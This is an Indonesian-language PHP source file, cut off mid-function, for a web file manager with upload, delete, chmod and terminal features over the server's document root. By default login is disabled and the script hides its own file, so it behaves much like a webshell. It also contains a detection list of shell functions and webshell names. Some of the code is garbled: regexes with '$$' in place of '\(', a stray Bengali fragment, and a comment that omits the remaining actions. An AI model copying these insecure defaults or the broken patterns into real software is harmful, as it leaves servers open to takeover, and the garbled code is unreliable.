<?php
session_start();
error_reporting(0); 

// --- PENGATURAN KRUSIAL UNTUK ENKRIPSI ---
// !! GANTI PASSPHRASE INI DENGAN SESUATU YANG KUAT, UNIK, DAN RAHASIA !!
// !! JANGAN SAMPAI HILANG, KARENA DATA KONFIGURASI TIDAK AKAN BISA DIBACA !!
define('LOG_CONFIG_ENCRYPTION_PASSPHRASE', 'GantiDenganPassphraseSuperRahasiaAndaYangPanjangDanKuat!'); // Harap ganti ini!
define('ENCRYPTION_CIPHER', 'AES-256-CBC'); // Metode enkripsi

define('CONFIG_LOG_FILE_PATH', __DIR__ . '/config_log.json');

// --- FUNGSI ENKRIPSI & DEKRIPSI ---
function get_encryption_key() {
    return hash('sha256', LOG_CONFIG_ENCRYPTION_PASSPHRASE, true);
}

function encrypt_data($data, $key) {
    if (!function_exists('openssl_encrypt')) return false;
    $iv_length = openssl_cipher_iv_length(ENCRYPTION_CIPHER);
    if ($iv_length === false) return false;
    $iv = openssl_random_pseudo_bytes($iv_length);
    $cipher_text = openssl_encrypt(json_encode($data), ENCRYPTION_CIPHER, $key, OPENSSL_RAW_DATA, $iv);
    if ($cipher_text === false) return false;
    return ['iv' => base64_encode($iv), 'cipher_text' => base64_encode($cipher_text)];
}

function decrypt_data($cipher_text_base64, $iv_base64, $key) {
    if (!function_exists('openssl_decrypt')) return false;
    $iv = base64_decode($iv_base64);
    $cipher_text = base64_decode($cipher_text_base64);
    $decrypted_json = openssl_decrypt($cipher_text, ENCRYPTION_CIPHER, $key, OPENSSL_RAW_DATA, $iv);
    if ($decrypted_json === false) return false;
    return json_decode($decrypted_json, true);
}

// --- FUNGSI UNTUK MEMUAT DAN MENYIMPAN KONFIGURASI LOGGING DARI/KE FILE JSON ---
function load_logging_config_from_file(&$main_config_array) {
    global $config_log_file_writable_warning, $openssl_unavailable_warning;
    
    $default_log_credentials = [
        'discord_webhook_url' => '', 'discord_username' => 'FileManager Bot',
        'telegram_bot_token' => '', 'telegram_chat_id' => '',
        'email_to_address' => '', 'email_from_address' => 'noreply@yourdomain.com',
        'email_subject_prefix' => '[FileMan Log]'
    ];

    $loaded_credentials = $default_log_credentials; 

    if (!function_exists('openssl_encrypt')) {
        $openssl_unavailable_warning = "Peringatan: Ekstensi OpenSSL PHP tidak tersedia. Konfigurasi logging akan disimpan/dibaca sebagai plain text (tidak aman). Sangat disarankan untuk mengaktifkan OpenSSL.";
    }

    if (file_exists(CONFIG_LOG_FILE_PATH) && is_readable(CONFIG_LOG_FILE_PATH)) {
        $json_content = file_get_contents(CONFIG_LOG_FILE_PATH);
        $data_from_file = json_decode($json_content, true);

        if (is_array($data_from_file)) {
            if (isset($data_from_file['iv']) && isset($data_from_file['cipher_text']) && function_exists('openssl_decrypt')) {
                $key = get_encryption_key();
                $decrypted = decrypt_data($data_from_file['cipher_text'], $data_from_file['iv'], $key);
                if ($decrypted !== false && is_array($decrypted)) {
                    $loaded_credentials = array_merge($default_log_credentials, $decrypted);
                } else {
                    $config_log_file_writable_warning .= " Error: Gagal mendekripsi " . basename(CONFIG_LOG_FILE_PATH) . ". File mungkin rusak atau passphrase salah. Menggunakan default. ";
                }
            } elseif (!isset($data_from_file['iv']) && !isset($data_from_file['cipher_text'])) {
                $loaded_credentials = array_merge($default_log_credentials, $data_from_file);
                if (function_exists('openssl_encrypt')) {
                    $save_attempt = save_logging_config_to_file($loaded_credentials, false); 
                    if ($save_attempt !== true) {
                         $config_log_file_writable_warning .= " Info: Mencoba mengenkripsi file konfigurasi log lama, tetapi gagal: " . (is_string($save_attempt) ? $save_attempt : "Unknown error") . ". ";
                    } else {
                         $config_log_file_writable_warning .= " Info: File konfigurasi log lama berhasil dienkripsi. ";
                    }
                }
            } else {
                 $config_log_file_writable_warning .= " Error: Format " . basename(CONFIG_LOG_FILE_PATH) . " tidak dikenali. Menggunakan default. ";
            }
        }
    } elseif (is_writable(__DIR__) && function_exists('openssl_encrypt')) {
        $save_attempt = save_logging_config_to_file($default_log_credentials, false);
        // Warning akan ditangani oleh save_logging_config_to_file jika gagal
    }
    
    if (isset($main_config_array['logging']['discord'])) {
         $main_config_array['logging']['discord']['webhook_url'] = $loaded_credentials['discord_webhook_url'];
         $main_config_array['logging']['discord']['username'] = $loaded_credentials['discord_username'];
    }
    if (isset($main_config_array['logging']['telegram'])) {
        $main_config_array['logging']['telegram']['bot_token'] = $loaded_credentials['telegram_bot_token'];
        $main_config_array['logging']['telegram']['chat_id'] = $loaded_credentials['telegram_chat_id'];
    }
    if (isset($main_config_array['logging']['email'])) {
        $main_config_array['logging']['email']['to_address'] = $loaded_credentials['email_to_address'];
        $main_config_array['logging']['email']['from_address'] = $loaded_credentials['email_from_address'];
        $main_config_array['logging']['email']['subject_prefix'] = $loaded_credentials['email_subject_prefix'];
    }
    return true;
}

function save_logging_config_to_file($data_to_save, $do_redirect_and_log = true) {
    $credentials_to_save = [
        'discord_webhook_url' => filter_var($data_to_save['discord_webhook_url'] ?? '', FILTER_SANITIZE_URL),
        'discord_username' => htmlspecialchars($data_to_save['discord_username'] ?? 'FileManager Bot', ENT_QUOTES, 'UTF-8'),
        'telegram_bot_token' => htmlspecialchars($data_to_save['telegram_bot_token'] ?? '', ENT_QUOTES, 'UTF-8'),
        'telegram_chat_id' => htmlspecialchars($data_to_save['telegram_chat_id'] ?? '', ENT_QUOTES, 'UTF-8'),
        'email_to_address' => filter_var($data_to_save['email_to_address'] ?? '', FILTER_SANITIZE_EMAIL),
        'email_from_address' => filter_var($data_to_save['email_from_address'] ?? 'noreply@yourdomain.com', FILTER_SANITIZE_EMAIL),
        'email_subject_prefix' => htmlspecialchars($data_to_save['email_subject_prefix'] ?? '[FileMan Log]', ENT_QUOTES, 'UTF-8'),
    ];

    $file_content_to_write = '';
    if (function_exists('openssl_encrypt')) {
        $key = get_encryption_key();
        $encrypted_payload = encrypt_data($credentials_to_save, $key);
        if ($encrypted_payload === false) {
            return "Error: Gagal mengenkripsi data konfigurasi.";
        }
        $file_content_to_write = json_encode($encrypted_payload, JSON_PRETTY_PRINT);
    } else {
        $file_content_to_write = json_encode($credentials_to_save, JSON_PRETTY_PRINT);
    }
    
    if (!is_writable(CONFIG_LOG_FILE_PATH)) {
        if (!file_exists(CONFIG_LOG_FILE_PATH) && !is_writable(__DIR__)) {
            return "Error: Direktori tidak dapat ditulis, file konfigurasi log (" . basename(CONFIG_LOG_FILE_PATH) . ") tidak dapat dibuat.";
        } elseif (file_exists(CONFIG_LOG_FILE_PATH) && !is_writable(CONFIG_LOG_FILE_PATH)) {
            return "Error: File konfigurasi log (" . basename(CONFIG_LOG_FILE_PATH) . ") tidak dapat ditulis. Periksa izin file.";
        }
    }

    if (@file_put_contents(CONFIG_LOG_FILE_PATH, $file_content_to_write) !== false) {
        if ($do_redirect_and_log) { 
            log_action("Logging Configuration Updated", "User updated external logging service credentials via UI.", "CONFIG_CHANGE");
        }
        return true;
    }
    return "Error: Gagal menyimpan konfigurasi log ke file (" . basename(CONFIG_LOG_FILE_PATH) . ").";
}

// --- KONFIGURASI UTAMA (Default) ---
$config = [
    'judul_filemanager' => 'Ayana File Manager',
    'deskripsi_filemanager' => 'Ayana File Manager adalah file manager berbasis web (PHP) dengan tampilan modern dark mode. Didesain untuk memudahkan pengelolaan file langsung dari browser, tanpa perlu akses FTP atau SSH.',
    'author_name' => 'Sw4CyEx',
    'author_github_url' => 'https://github.com/Sw4CyEx/',
    'author_repo_url' => 'https://github.com/Sw4CyEx/AyanaFileManager',
    'direktori_dasar' => $_SERVER['DOCUMENT_ROOT'],
    'aktifkan_login' => false, // Ubah ke true untuk mengaktifkan login
    'pengguna' => [
        'admin' => '$2y$10$xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx' // GANTI HASH INI! Buat dengan password_hash("password_anda", PASSWORD_DEFAULT);
    ],
    'fitur_berbahaya' => [
        'terminal' => true, 
        'edit_chmod_luas' => true, 
        'tampilkan_error_php' => false, 
        'akses_pengaturan_log' => true, 
    ],
    'sembunyikan_item' => ['.', '..', '.htaccess', '.htpasswd', basename(__FILE__), basename(CONFIG_LOG_FILE_PATH)], 
    'zona_waktu' => 'Asia/Jakarta',
    'max_upload_size_mb' => 100, 
    'default_chmod_folder' => 0755,
    'default_chmod_file' => 0644,
    'editable_extensions' => [
        'txt', 'md', 'log', 'json', 'xml', 'js', 'css', 'html', 'php', 
        'py', 'sh', 'ini', 'cfg', 'conf', 'env', 'sql', 'csv', 'bat', 'yaml', 'yml'
    ],
    'malicious_patterns' => [ 
        'eval\(base64_decode\(', 'eval\(gzinflate\(base64_decode\(', 'passthru\(', 'shell_exec\(', 'system\(',
        'php_uname\(', 'fsockopen\(', 'pfsockopen\(', 'assert\(', 'str_rot13\(', 'gzuncompress\(',
        'create_function\s*\(', 
        '\$_REQUEST\s*\[\s*[\'"][a-zA-Z0-9_]+[\'"]\s*\]\s*$$\s*\$_REQUEST\s*\[\s*[\'"][a-zA-Z0-9_]+[\'"]\s*\]\s*$$', 
        'move_uploaded_file\s*$$\s*\$_FILES\s*\[.+?\]\s*\[\s*[\'"]tmp_name[\'"]\s*\]\s*,\s*\$_FILES\s*\[.+?\]\s*\[\s*[\'"]name[\'"]\s*\]\s*$$',
        'webshell', 'c99', 'r57', 'phpspy', 'shell_ দেখুনঃ', 'document\.write\(unescape\(', 'fromCharCode\('
    ],
    'scan_file_max_size_kb' => 512, 
    'enable_malware_scan_on_list' => true,
    'logging' => [ 
        'enabled' => true, 
        'log_ip_address' => true, 
        'discord' => [ 'enabled' => false, 'webhook_url' => '', 'username' => 'FileManager Bot' ],
        'telegram' => [ 'enabled' => false, 'bot_token' => '', 'chat_id' => '' ],
        'email' => [ 'enabled' => false, 'to_address' => '', 'from_address' => 'noreply@yourdomain.com', 'subject_prefix' => '[FileMan Log]' ],
    ],
];

$config_log_file_writable_warning = ''; 
$openssl_unavailable_warning = ''; 
load_logging_config_from_file($config);

if ($config['fitur_berbahaya']['tampilkan_error_php']) {
    error_reporting(E_ALL);
    ini_set('display_errors', 1);
}
date_default_timezone_set($config['zona_waktu']);

// --- FUNGSI LOGGING ---
function send_to_discord($message, $webhook_url, $bot_username) {
    if (!function_exists('curl_init') || empty($webhook_url)) return false;
    $data = json_encode(['content' => $message, 'username' => $bot_username]);
    $ch = curl_init($webhook_url);
    curl_setopt_array($ch, [CURLOPT_HTTPHEADER => ['Content-Type: application/json'], CURLOPT_POST => 1, CURLOPT_POSTFIELDS => $data, CURLOPT_RETURNTRANSFER => true, CURLOPT_TIMEOUT => 5, CURLOPT_CONNECTTIMEOUT => 5]);
    $result = curl_exec($ch); $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE); curl_close($ch);
    return ($http_code >= 200 && $http_code < 300);
}

function send_to_telegram($message, $bot_token, $chat_id) {
    if (!function_exists('curl_init') || empty($bot_token) || empty($chat_id)) return false;
    $url = "https://api.telegram.org/bot{$bot_token}/sendMessage";
    $tg_message = str_replace(['_', '*', '[', ']', '(', ')', '~', '`', '>', '#', '+', '-', '=', '|', '{', '}', '.', '!'], ['\_', '\*', '\[', '\]', '$$', '$$', '\~', '\`', '\>', '\#', '\+', '\-', '\=', '\|', '\{', '\}', '\.', '\!'], $message);
    $data = ['chat_id' => $chat_id, 'text' => $tg_message, 'parse_mode' => 'MarkdownV2'];
    $ch = curl_init();
    curl_setopt_array($ch, [CURLOPT_URL => $url, CURLOPT_POST => 1, CURLOPT_POSTFIELDS => http_build_query($data), CURLOPT_RETURNTRANSFER => true, CURLOPT_TIMEOUT => 5, CURLOPT_CONNECTTIMEOUT => 5]);
    $result = curl_exec($ch); curl_close($ch); return (bool)$result; 
}

function send_to_email($message, $to_address, $from_address, $subject_prefix, $status) {
    if (empty($to_address) || empty($from_address)) return false;
    $subject = "{$subject_prefix} [$status] Notifikasi Aksi";
    $headers = "From: {$from_address}\r\nReply-To: {$from_address}\r\nContent-Type: text/plain; charset=UTF-8\r\nX-Mailer: PHP/" . phpversion();
    return mail($to_address, $subject, $message, $headers);
}

function is_service_logging_active($service_name) {
    global $config; if (!$config['logging']['enabled']) return false; 
    $service_config_enabled = $config['logging'][$service_name]['enabled'] ?? false;
    $session_key = 'logging_override_' . $service_name . '_enabled';
    return isset($_SESSION[$session_key]) ? $_SESSION[$session_key] : $service_config_enabled; 
}

function log_action($action_name, $details = "", $status = "INFO") {
    global $config; if (!$config['logging']['enabled']) return;
    $timestamp = date("Y-m-d H:i:s T");
    $log_message = "[$timestamp] [$status] $action_name";
    if ($config['logging']['log_ip_address'] && isset($_SERVER['REMOTE_ADDR'])) $log_message .= " | IP: " . $_SERVER['REMOTE_ADDR'];
    if (isset($_SESSION['pengguna_login'])) $log_message .= " | User: " . $_SESSION['pengguna_login'];
    if (!empty($details)) $log_message .= " | Details: " . (is_array($details) ? json_encode($details) : $details);

    if (is_service_logging_active('discord') && !empty($config['logging']['discord']['webhook_url'])) send_to_discord($log_message, $config['logging']['discord']['webhook_url'], $config['logging']['discord']['username']);
    if (is_service_logging_active('telegram') && !empty($config['logging']['telegram']['bot_token']) && !empty($config['logging']['telegram']['chat_id'])) send_to_telegram($log_message, $config['logging']['telegram']['bot_token'], $config['logging']['telegram']['chat_id']);
    if (is_service_logging_active('email') && !empty($config['logging']['email']['to_address'])) send_to_email($log_message, $config['logging']['email']['to_address'], $config['logging']['email']['from_address'], $config['logging']['email']['subject_prefix'], $status);
}

// --- FUNGSI HELPER ---
function sanitize_path($path) { return str_replace(['..', "\0"], '', $path); }
function get_current_path() { global $config; $path = $_GET['path'] ?? ''; $path = sanitize_path($path); $full_path = realpath($config['direktori_dasar'] . DIRECTORY_SEPARATOR . $path); if (!$full_path || strpos($full_path, realpath($config['direktori_dasar'])) !== 0) { return realpath($config['direktori_dasar']); } return $full_path; }
function get_relative_path($full_path) { global $config; return ltrim(str_replace(realpath($config['direktori_dasar']), '', $full_path), DIRECTORY_SEPARATOR); }
function format_size($bytes) { if ($bytes >= 1073741824) { $bytes = number_format($bytes / 1073741824, 2) . ' GB'; } elseif ($bytes >= 1048576) { $bytes = number_format($bytes / 1048576, 2) . ' MB'; } elseif ($bytes >= 1024) { $bytes = number_format($bytes / 1024, 2) . ' KB'; } elseif ($bytes > 1) { $bytes = $bytes . ' bytes'; } elseif ($bytes == 1) { $bytes = $bytes . ' byte'; } else { $bytes = '0 bytes'; } return $bytes; }
function get_file_icon($item_path) { if (is_dir($item_path)) return '📁'; $ext = strtolower(pathinfo($item_path, PATHINFO_EXTENSION)); switch ($ext) { case 'txt': case 'md': case 'log': return '📄'; case 'jpg': case 'jpeg': case 'png': case 'gif': case 'bmp': case 'svg': case 'webp': return '🖼️'; case 'pdf': return '📚'; case 'zip': case 'rar': case 'tar': case 'gz': return '📦'; case 'mp3': case 'wav': case 'ogg': case 'flac': return '🎵'; case 'mp4': case 'avi': case 'mov': case 'mkv': case 'webm': return '🎞️'; case 'doc': case 'docx': return '📝'; case 'xls': case 'xlsx': case 'csv': return '📊'; case 'ppt': case 'pptx': return '🖥️'; case 'js': case 'json': case 'html': case 'css': case 'php': case 'py': case 'sh': case 'sql': case 'yaml': case 'yml': return '⚙️'; default: return '📎'; } }
function check_login() { global $config; if (!$config['aktifkan_login']) return true; return isset($_SESSION['pengguna_login']); }
function handle_login() { 
    global $config; 
    if (isset($_POST['username']) && isset($_POST['password'])) { 
        $username = $_POST['username']; $password = $_POST['password']; 
        if (isset($config['pengguna'][$username]) && password_verify($password, $config['pengguna'][$username])) { 
            $_SESSION['pengguna_login'] = $username; 
            log_action("Login Success", "Username: " . htmlspecialchars($username), "SUCCESS");
            header("Location: " . basename(__FILE__)); exit; 
        } else { 
            log_action("Login Failed", "Username: " . htmlspecialchars($username), "WARNING");
            return "Username atau password salah."; 
        } 
    } return null; 
}
function handle_logout() { 
    log_action("Logout", "User: " . ($_SESSION['pengguna_login'] ?? 'N/A'), "INFO");
    session_destroy(); header("Location: " . basename(__FILE__)); exit; 
}
function delete_recursive($dir) { if (!file_exists($dir)) return true; if (!is_dir($dir)) return unlink($dir); foreach (scandir($dir) as $item) { if ($item == '.' || $item == '..') continue; if (!delete_recursive($dir . DIRECTORY_SEPARATOR . $item)) return false; } return rmdir($dir); }
function get_owner_name($path) { if (function_exists('posix_getpwuid')) { $owner_info = posix_getpwuid(fileowner($path)); return $owner_info['name'] ?? fileowner($path); } return fileowner($path); }
function is_file_editable($file_path) { global $config; if (!is_file($file_path) || !is_readable($file_path)) return false; $ext = strtolower(pathinfo($file_path, PATHINFO_EXTENSION)); return in_array($ext, $config['editable_extensions']); }
function scan_for_malicious_patterns($file_path) { global $config; if (!is_file($file_path) || !is_readable($file_path) || filesize($file_path) == 0 || filesize($file_path) > ($config['scan_file_max_size_kb'] * 1024)) { return false; } $content = @file_get_contents($file_path, false, null, 0, ($config['scan_file_max_size_kb'] * 1024)); if ($content === false) return false; foreach ($config['malicious_patterns'] as $pattern) { if (preg_match('/' . $pattern . '/i', $content)) { return true; } } return false; }

// --- LOGIKA AKSI ---
$current_path = get_current_path();
$relative_current_path = get_relative_path($current_path);
$login_error = null;
$action_message = null; 

if ($config['aktifkan_login'] && !check_login()) {
    $login_error = handle_login();
    if (check_login()) { header("Location: " . basename(__FILE__) . "?path=" . urlencode($relative_current_path)); exit; }
}
$aksi = $_GET['aksi'] ?? '';
if (isset($_GET['status_msg'])) { $action_message = ['type' => ($_GET['status_type'] ?? 'success'), 'text' => urldecode($_GET['status_msg'])]; }

if ($config['aktifkan_login'] && !check_login() && $aksi !== 'login_page') { /* Tampilkan login */ } 
elseif ($aksi === 'logout') { handle_logout(); } 
elseif (($aksi === 'toggle_logging_service' || $aksi === 'save_logging_config') && !$config['fitur_berbahaya']['akses_pengaturan_log']) {
    $msg = "Akses ke pengaturan log dinonaktifkan oleh administrator."; $type = "danger";
    log_action("Logging Action Attempt Denied", "Feature 'akses_pengaturan_log' disabled for action: ".$aksi, "WARNING");
    header("Location: " . basename(__FILE__) . "?path=" . urlencode($relative_current_path) . "&status_msg=" . urlencode($msg) . "&status_type=" . $type . "&show_logging_settings=true");
    exit;
}
elseif ($aksi === 'toggle_logging_service' && isset($_GET['service'])) {
    $service = $_GET['service']; $valid_services = ['discord', 'telegram', 'email'];
    if (in_array($service, $valid_services)) {
        $session_key = 'logging_override_' . $service . '_enabled';
        $current_effective_status = $config['logging'][$service]['enabled'] ?? false;
        if (isset($_SESSION[$session_key])) $current_effective_status = $_SESSION[$session_key];
        $_SESSION[$session_key] = !$current_effective_status;
        $new_status_text = ($_SESSION[$session_key] ? "diaktifkan" : "dinonaktifkan");
        $msg = "Logging untuk " . ucfirst($service) . " berhasil " . $new_status_text . " untuk sesi ini."; $type = "success";
        log_action("Logging Setting Changed by User (Toggle)", "Service: ".ucfirst($service).", New Session Status: ".($_SESSION[$session_key] ? "Enabled" : "Disabled"), "INFO");
    } else { $msg = "Layanan logging tidak valid."; $type = "danger"; }
    header("Location: " . basename(__FILE__) . "?path=" . urlencode($relative_current_path) . "&status_msg=" . urlencode($msg) . "&status_type=" . $type . "&show_logging_settings=true"); exit;
}
elseif ($aksi === 'save_logging_config' && $_SERVER['REQUEST_METHOD'] === 'POST') {
    if (check_login() || !$config['aktifkan_login']) {
        $save_result = save_logging_config_to_file($_POST); 
        if ($save_result === true) {
            $msg = "Konfigurasi logging eksternal berhasil disimpan."; $type = "success";
            load_logging_config_from_file($config); 
        } else { $msg = $save_result; $type = "danger"; }
    } else { $msg = "Anda harus login untuk menyimpan konfigurasi."; $type = "danger"; }
    header("Location: " . basename(__FILE__) . "?path=" . urlencode($relative_current_path) . "&status_msg=" . urlencode($msg) . "&status_type=" . $type . "&show_logging_settings=true"); exit;
}
// ... (Sisa logika aksi seperti upload, create_folder, dll. tetap sama) ...
// Pastikan semua aksi lain ada di dalam blok elseif (check_login() || !$config['aktifkan_login']) { ... }
elseif (check_login() || !$config['aktifkan_login']) {
    $msg = ""; $type = "info"; 
    if ($aksi === 'upload' && $_SERVER['REQUEST_METHOD'] === 'POST') {
        if (isset($_FILES['files'])) {
            $files = $_FILES['files']; $upload_count = 0; $errors = []; $malware_detected_files = [];
            for ($i = 0; $i < count($files['name']); $i++) {
                if ($files['error'][$i] === UPLOAD_ERR_OK) {
                    $tmp_name = $files['tmp_name'][$i]; $name = sanitize_path(basename($files['name'][$i]));
                    $destination = $current_path . DIRECTORY_SEPARATOR . $name;
                    if (move_uploaded_file($tmp_name, $destination)) { 
                        $upload_count++;
                        log_action("File Uploaded", "File: " . htmlspecialchars($name) . ", Path: " . htmlspecialchars($relative_current_path), "SUCCESS");
                        if (scan_for_malicious_patterns($destination)) {
                            $malware_detected_files[] = htmlspecialchars($name);
                            log_action("Malware Detected on Upload", "File: " . htmlspecialchars($name) . ", Path: " . htmlspecialchars($relative_current_path), "CRITICAL");
                        }
                    } else { 
                        $errors[] = "Gagal mengunggah " . htmlspecialchars($name); 
                        log_action("File Upload Failed", "File: " . htmlspecialchars($name) . ", Path: " . htmlspecialchars($relative_current_path), "ERROR");
                    }
                } elseif ($files['error'][$i] !== UPLOAD_ERR_NO_FILE) { 
                    $errors[] = "Error pada file " . htmlspecialchars($files['name'][$i]) . ": " . $files['error'][$i];
                    log_action("File Upload Error", "File: " . htmlspecialchars($files['name'][$i]) . ", Error Code: " . $files['error'][$i], "ERROR");
                }
            }
            $msg = $upload_count . " file berhasil diunggah.";
            if (!empty($malware_detected_files)) $msg .= " Peringatan: Potensi kode berbahaya terdeteksi di file: " . implode(', ', $malware_detected_files) . ".";
            if (!empty($errors)) $msg .= " Kesalahan: " . implode(", ", $errors);
            $type = (empty($errors) && empty($malware_detected_files) ? "success" : (empty($errors) ? "warning" : "danger"));
        } else { $msg = "Tidak ada file yang dipilih untuk diunggah."; $type = "warning"; log_action("Upload Attempt Failed", "No files selected", "WARNING");}
        header("Location: " . basename(__FILE__) . "?path=" . urlencode($relative_current_path) . "&status_msg=" . urlencode($msg) . "&status_type=" . $type); exit;
    } elseif ($aksi === 'create_folder' && isset($_POST['folder_name'])) {
        $folder_name = sanitize_path(basename($_POST['folder_name']));
        if (!empty($folder_name) && !file_exists($current_path . DIRECTORY_SEPARATOR . $folder_name)) {
            if(mkdir($current_path . DIRECTORY_SEPARATOR . $folder_name, $config['default_chmod_folder'])) {
                $msg = "Folder '" . htmlspecialchars($folder_name) . "' berhasil dibuat."; $type = "success";
                log_action("Folder Created", "Name: " . htmlspecialchars($folder_name) . ", Path: " . htmlspecialchars($relative_current_path), "SUCCESS");
            } else { 
                $msg = "Gagal membuat folder '" . htmlspecialchars($folder_name) . "'. Periksa izin."; $type = "danger"; 
                log_action("Folder Creation Failed", "Name: " . htmlspecialchars($folder_name) . ", Path: " . htmlspecialchars($relative_current_path), "ERROR");
            }
        } else { 
            $msg = "Nama folder tidak valid, kosong, atau sudah ada."; $type = "danger"; 
            log_action("Folder Creation Attempt Failed", "Invalid/Existing Name: " . htmlspecialchars($folder_name), "WARNING");
        }
        header("Location: " . basename(__FILE__) . "?path=" . urlencode($relative_current_path) . "&status_msg=" . urlencode($msg) . "&status_type=" . $type); exit;
    } elseif ($aksi === 'create_file' && isset($_POST['file_name'])) {
        $file_name = sanitize_path(basename($_POST['file_name']));
        if (!empty($file_name) && !file_exists($current_path . DIRECTORY_SEPARATOR . $file_name)) {
            if (file_put_contents($current_path . DIRECTORY_SEPARATOR . $file_name, '') !== false && chmod($current_path . DIRECTORY_SEPARATOR . $file_name, $config['default_chmod_file'])) {
                $msg = "File '" . htmlspecialchars($file_name) . "' berhasil dibuat."; $type = "success";
                log_action("File Created", "Name: " . htmlspecialchars($file_name) . ", Path: " . htmlspecialchars($relative_current_path), "SUCCESS");
            } else { 
                $msg = "Gagal membuat file '" . htmlspecialchars($file_name) . "'. Periksa izin."; $type = "danger"; 
                log_action("File Creation Failed", "Name: " . htmlspecialchars($file_name) . ", Path: " . htmlspecialchars($relative_current_path), "ERROR");
            }
        } else { 
            $msg = "Nama file tidak valid, kosong, atau sudah ada."; $type = "danger"; 
            log_action("File Creation Attempt Failed", "Invalid/Existing Name: " . htmlspecialchars($file_name), "WARNING");
        }
        header("Location: " . basename(__FILE__) . "?path=" . urlencode($relative_current_path) . "&status_msg=" . urlencode($msg) . "&status_type=" . $type); exit;
    } elseif ($aksi === 'delete' && isset($_GET['item'])) {
        $item_to_delete = sanitize_path(basename($_GET['item']));
        $item_full_path = $current_path . DIRECTORY_SEPARATOR . $item_to_delete;
        if (file_exists($item_full_path) && !in_array($item_to_delete, $config['sembunyikan_item'])) {
            if (delete_recursive($item_full_path)) {
                $msg = "Item '" . htmlspecialchars($item_to_delete) . "' berhasil dihapus."; $type = "success";
                log_action("Item Deleted", "Item: " . htmlspecialchars($item_to_delete) . ", Path: " . htmlspecialchars($relative_current_path), "SUCCESS");
            } else { 
                $msg = "Gagal menghapus item '" . htmlspecialchars($item_to_delete) . "'."; $type = "danger"; 
                log_action("Item Deletion Failed", "Item: " . htmlspecialchars($item_to_delete) . ", Path: " . htmlspecialchars($relative_current_path), "ERROR");
            }
        } else { 
            $msg = "Item tidak ditemukan atau tidak diizinkan untuk dihapus."; $type = "danger"; 
            log_action("Item Deletion Attempt Failed", "Not Found/Forbidden: " . htmlspecialchars($item_to_delete), "WARNING");
        }
        header("Location: " . basename(__FILE__) . "?path=" . urlencode($relative_current_path) . "&status_msg=" . urlencode($msg) . "&status_type=" . $type); exit;
    } elseif ($aksi === 'multi_delete' && isset($_POST['items_to_zip']) && is_array($_POST['items_to_zip'])) {
        $items_to_delete_arr = $_POST['items_to_zip']; 
        $deleted_count = 0; $error_count = 0; $error_details = []; $deleted_items_log = [];
        foreach ($items_to_delete_arr as $item_name) {
            $item_name_sanitized = sanitize_path(basename($item_name));
            $item_full_path = $current_path . DIRECTORY_SEPARATOR . $item_name_sanitized;
            if (file_exists($item_full_path) && !in_array($item_name_sanitized, $config['sembunyikan_item'])) {
                if (delete_recursive($item_full_path)) { $deleted_count++; $deleted_items_log[] = $item_name_sanitized; } 
                else { $error_count++; $error_details[] = htmlspecialchars($item_name_sanitized); }
            } else { $error_count++; $error_details[] = htmlspecialchars($item_name_sanitized) . " (tidak ada/dilarang)"; }
        }
        $msg = $deleted_count . " item berhasil dihapus.";
        if ($error_count > 0) { $msg .= " " . $error_count . " item gagal dihapus: " . implode(', ', $error_details) . "."; }
        $type = ($error_count == 0) ? "success" : ($deleted_count > 0 ? "warning" : "danger");
        log_action("Multi-Item Delete", "Deleted: " . implode(', ', $deleted_items_log) . ($error_count > 0 ? ", Failed: " . implode(', ', $error_details) : "") . ", Path: " . htmlspecialchars($relative_current_path), $type == "success" ? "SUCCESS" : ($type == "warning" ? "WARNING" : "ERROR"));
        header("Location: " . basename(__FILE__) . "?path=" . urlencode($relative_current_path) . "&status_msg=" . urlencode($msg) . "&status_type=" . $type); exit;
    } elseif ($aksi === 'rename' && isset($_POST['old_name']) && isset($_POST['new_name'])) {
        $old_name = sanitize_path(basename($_POST['old_name'])); $new_name = sanitize_path(basename($_POST['new_name']));
        $old_full_path = $current_path . DIRECTORY_SEPARATOR . $old_name; $new_full_path = $current_path . DIRECTORY_SEPARATOR . $new_name;
        if (empty($new_name)) { $msg = "Nama baru tidak boleh kosong."; $type = "danger"; log_action("Rename Failed", "Old: ".htmlspecialchars($old_name).", New name empty", "WARNING");}
        elseif (file_exists($new_full_path)) { $msg = "Nama baru '" . htmlspecialchars($new_name) . "' sudah ada."; $type = "danger"; log_action("Rename Failed", "Old: ".htmlspecialchars($old_name).", New: ".htmlspecialchars($new_name)." (already exists)", "WARNING");}
        elseif (!file_exists($old_full_path)) { $msg = "Item lama '" . htmlspecialchars($old_name) . "' tidak ditemukan."; $type = "danger"; log_action("Rename Failed", "Old: ".htmlspecialchars($old_name)." (not found)", "WARNING");}
        elseif (rename($old_full_path, $new_full_path)) { 
            $msg = "Item '" . htmlspecialchars($old_name) . "' berhasil di-rename menjadi '" . htmlspecialchars($new_name) . "'."; $type = "success"; 
            log_action("Item Renamed", "Old: ".htmlspecialchars($old_name).", New: ".htmlspecialchars($new_name).", Path: ".htmlspecialchars($relative_current_path), "SUCCESS");
        } else { 
            $msg = "Gagal me-rename item '" . htmlspecialchars($old_name) . "'. Periksa izin."; $type = "danger"; 
            log_action("Rename Failed", "Old: ".htmlspecialchars($old_name).", New: ".htmlspecialchars($new_name).", Path: ".htmlspecialchars($relative_current_path), "ERROR");
        }
        header("Location: " . basename(__FILE__) . "?path=" . urlencode($relative_current_path) . "&status_msg=" . urlencode($msg) . "&status_type=" . $type); exit;
    } elseif ($aksi === 'chmod' && isset($_POST['item']) && isset($_POST['permissions'])) {
        if (!$config['fitur_berbahaya']['edit_chmod_luas']) {
            $msg = "Fitur ubah izin (chmod) dinonaktifkan oleh administrator."; $type = "warning";
            log_action("Chmod Attempt Denied", "Feature disabled by admin", "WARNING");
        } else {
            $item_to_chmod = sanitize_path(basename($_POST['item'])); $permissions = $_POST['permissions']; 
            $item_full_path = $current_path . DIRECTORY_SEPARATOR . $item_to_chmod;
            if (!file_exists($item_full_path)) { $msg = "Item '" . htmlspecialchars($item_to_chmod) . "' tidak ditemukan."; $type = "danger"; log_action("Chmod Failed", "Item: ".htmlspecialchars($item_to_chmod)." (not found)", "WARNING");}
            elseif (!preg_match('/^0[0-7]{3}$/', $permissions)) { $msg = "Format izin tidak valid. Gunakan format octal 4 digit (mis: 0755)."; $type = "danger"; log_action("Chmod Failed", "Item: ".htmlspecialchars($item_to_chmod).", Invalid perms: ".$permissions, "WARNING");}
            elseif (chmod($item_full_path, octdec($permissions))) { 
